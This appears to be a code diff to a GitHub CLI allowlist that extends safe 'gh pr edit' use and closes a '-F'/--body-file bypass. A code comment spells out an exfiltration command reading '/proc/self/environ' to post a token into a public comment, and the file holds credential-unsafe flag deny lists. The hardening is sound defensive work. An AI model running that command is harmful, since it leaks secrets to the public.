@@ -322,7 +322,20 @@ function addGraphqlQuery(queries: string[], field: string): void {
 
 const SAFE_GH_OPERATIONS: Readonly<Record<string, ReadonlySet<string>>> = {
   api: new Set(['']),
-  pr: new Set(['view', 'list', 'status', 'checks', 'diff', 'review', 'comment', 'close', 'reopen', 'ready', 'merge']),
+  pr: new Set([
+    'view',
+    'list',
+    'status',
+    'checks',
+    'diff',
+    'review',
+    'comment',
+    'close',
+    'reopen',
+    'ready',
+    'merge',
+    'edit',
+  ]),
   issue: new Set(['view', 'list', 'status', 'comment', 'close', 'reopen', 'create']),
   label: new Set(['list', 'create', 'edit', 'delete', 'clone']),
   release: new Set(['view', 'list']),
@@ -345,6 +358,26 @@ const CREDENTIAL_UNSAFE_FLAGS = new Set([
   '--web',
   '--delete-branch',
 ])
+
+// `gh pr edit` field flags whose values are inline argv strings. Every one is a
+// label/login/name/free-text operand — none names a file, a host, or a template,
+// so they satisfy the same credential-safety criterion as `gh pr comment --body`.
+// `-F`/`--body-file` (file read) and `-t` (template) are excluded here and denied
+// by CREDENTIAL_UNSAFE_FLAGS and the api-field scoping above.
+const PR_EDIT_FIELD_FLAGS = new Set([
+  '--add-label',
+  '--remove-label',
+  '--add-assignee',
+  '--remove-assignee',
+  '--add-reviewer',
+  '--remove-reviewer',
+  '--add-project',
+  '--remove-project',
+  '--remove-milestone',
+])
+
+const PR_EDIT_IDENTIFIER_FLAGS = new Set([...PR_EDIT_FIELD_FLAGS, '--milestone', '--base'])
+const PR_EDIT_TEXT_FLAGS = new Set(['--title', '--body', '-b'])
 
 const CREDENTIAL_SAFE_FLAGS = new Set([
   '-R',
@@ -404,6 +437,7 @@ const CREDENTIAL_SAFE_FLAGS = new Set([
   '--confirm',
   '--branch',
   '--event',
+  ...PR_EDIT_FIELD_FLAGS,
 ])
 
 function isCredentialSafeGhCommand(command: string): boolean {
@@ -413,6 +447,21 @@ function isCredentialSafeGhCommand(command: string): boolean {
   if (!isSingleBareGhCommand(ghStage) || hasUnsafeGhStageBackslash(ghStage)) return false
   const tokens = tokenize(ghStage)
   return tokens[0] === 'gh' && isCredentialSafeGhArgs(tokens.slice(1))
+}
+
+// Flag NAMES are scoped by Cobra command, so a name-only allowlist is not a
+// flag allowlist. `-F` is `--field` for `gh api`/`gh workflow run`, but Cobra
+// binds it to `--body-file` on every pr/issue command in SAFE_GH_OPERATIONS:
+// `gh pr comment 1 -R o/r -F /proc/self/environ` reads the minted token out of
+// gh's own environ and posts it to a public comment thread. The long `--body-file`
+// was denied while its short alias walked straight through the same allowlist.
+// `-f` keeps its `gh label create/clone` `--force` meaning — the same command
+// scoping `ghFlagTakesValue` already applies when finding positionals.
+const API_FIELD_FLAGS = new Set(['-f', '--raw-field', '-F', '--field'])
+
+function acceptsApiFieldFlag(command: string, flag: string): boolean {
+  if (command === 'api' || command === 'workflow') return true
+  return flag === '-f' && command === 'label'
 }
 
 function isCredentialSafeGhArgs(args: readonly string[]): boolean {
@@ -427,6 +476,9 @@ function isCredentialSafeGhArgs(args: readonly string[]): boolean {
   if (command === 'issue' && operation === 'create' && !isSafeCreateArgs(args)) {
     return false
   }
+  if (command === 'pr' && operation === 'edit' && !isSafePrEditArgs(args)) {
+    return false
+  }
 
   for (let i = 0; i < args.length; i++) {
     const arg = args[i] as string
@@ -434,10 +486,8 @@ function isCredentialSafeGhArgs(args: readonly string[]): boolean {
     if (CREDENTIAL_UNSAFE_FLAGS.has(flag)) return false
     if (flag.endsWith('-file') || flag.endsWith('-file-name')) return false
     if (arg.startsWith('-') && !CREDENTIAL_SAFE_FLAGS.has(flag)) return false
-    if (
-      (command === 'api' || command === 'workflow') &&
-      (flag === '--raw-field' || flag === '-f' || flag === '--field' || flag === '-F')
-    ) {
+    if (API_FIELD_FLAGS.has(flag) && !acceptsApiFieldFlag(command, flag)) return false
+    if ((command === 'api' || command === 'workflow') && API_FIELD_FLAGS.has(flag)) {
       const value = flagValue(args, i)
       if (value === null || fieldDereferencesFile(value)) return false
     }
@@ -468,6 +518,30 @@ function isSafeCreateArgs(args: readonly string[]): boolean {
   ])
   if (args.some((arg) => forbidden.has(arg.includes('=') ? arg.slice(0, arg.indexOf('=')) : arg))) return false
   return true
+}
+
+// `gh pr edit` with no field flag drops into an interactive survey and spawns
+// $EDITOR for the body — a child process that inherits the minted token, the
+// same shape `gh pr merge --delete-branch` is denied for. Requiring at least one
+// recognized inline field flag keeps the invocation non-interactive. Identifier
+// operands additionally reject `@` values, mirroring isSafeCreateArgs; `--title`
+// and `--body` are free text where a leading `@mention` is legitimate and gh
+// performs no file dereference.
+function isSafePrEditArgs(args: readonly string[]): boolean {
+  let hasField = false
+  for (let i = 0; i < args.length; i++) {
+    const arg = args[i] as string
+    if (!arg.startsWith('-')) continue
+    const flag = arg.includes('=') ? arg.slice(0, arg.indexOf('=')) : arg
+    const isIdentifierField = PR_EDIT_IDENTIFIER_FLAGS.has(flag)
+    if (!isIdentifierField && !PR_EDIT_TEXT_FLAGS.has(flag)) continue
+    hasField = true
+    if (flag === '--remove-milestone') continue
+    const value = flagValue(args, i)
+    if (value === null || value.trim() === '') return false
+    if (isIdentifierField && value.startsWith('@')) return false
+  }
+  return hasField
 }
 
 function findFlagValue(args: readonly string[], names: readonly string[]): string | null {
@@ -1100,6 +1174,14 @@ const GH_FLAGS_WITH_VALUES = new Set([
   '--description',
   '--branch',
   '--event',
+  '--add-label',
+  '--remove-label',
+  '--add-assignee',
+  '--remove-assignee',
+  '--add-reviewer',
+  '--remove-reviewer',
+  '--add-project',
+  '--remove-project',
 ])
 
 const PR_REPO_SELECTOR_OPERATIONS = new Set([
@@ -1115,6 +1197,7 @@ const PR_REPO_SELECTOR_OPERATIONS = new Set([
   'ready',
   'merge',
   'checkout',
+  'edit',
 ])
 const ISSUE_REPO_SELECTOR_OPERATIONS = new Set(['view', 'list', 'status', 'comment', 'close', 'reopen'])
 
